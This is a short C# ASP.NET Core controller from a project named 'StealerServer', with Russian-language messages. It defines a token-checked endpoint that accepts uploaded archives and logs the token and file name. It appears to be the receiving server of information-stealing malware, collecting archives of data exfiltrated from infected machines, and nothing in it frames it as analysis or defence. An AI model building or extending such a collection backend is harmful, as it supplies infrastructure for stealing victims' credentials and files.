using Microsoft.AspNetCore.Mvc;
using StealerServer.Service;

namespace StealerServer.Controllers;

[ApiController]
[Route("api/[controller]")]
public class UploadController : ControllerBase
{
    private readonly UploadService _uploadService;

    public UploadController(UploadService uploadService)
    {
        _uploadService = uploadService;
    }

    [HttpPost("archive")]
    public async Task<IActionResult> UploadArchive()
    {
        if (!Request.Headers.TryGetValue("X-Secret-Token", out var clientToken))
        {
            return Unauthorized("Токен отсутствует.");
        }

        if (!Request.Headers.TryGetValue("X-File-Name", out var clientFileName) || string.IsNullOrEmpty(clientFileName))
        {
            clientFileName = "archive.zip";
        }

        // Передаем токен, имя и сам поток байт из тела запроса в сервис
        bool isUploaded = await _uploadService.UploadArchiveAsync(clientToken, clientFileName, Request.Body);

        if (!isUploaded)
        {
            return Unauthorized("Неверный или просроченный токен.");
        }

        Console.WriteLine(clientToken);
        Console.WriteLine(clientFileName);
        Console.WriteLine("Запрос успешно обработан сервисом!");

        return Ok();
    }
}
